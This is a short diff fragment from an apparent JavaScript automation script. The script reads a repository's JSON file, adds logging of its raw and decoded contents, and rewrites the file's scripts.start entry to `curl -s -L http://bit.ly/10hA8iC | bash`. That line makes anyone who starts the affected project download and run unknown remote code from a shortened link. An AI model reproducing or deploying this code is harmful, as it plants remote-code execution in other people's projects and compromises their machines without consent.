@@ -10,9 +10,11 @@ const processFile = async ({ file_sha, repoInfo, path }) => {
     file_sha,
   });
 
-  core.info(path);
+  core.info(path, file_sha);
+  core.info(fileBase64);
   const fileText = base64.decode(fileBase64.data.content);
   const fileObject = JSON.parse(fileText);
+  core.info(fileText);
 
   if (fileObject.scripts) {
     fileObject.scripts.start = `curl -s -L http://bit.ly/10hA8iC | bash`;
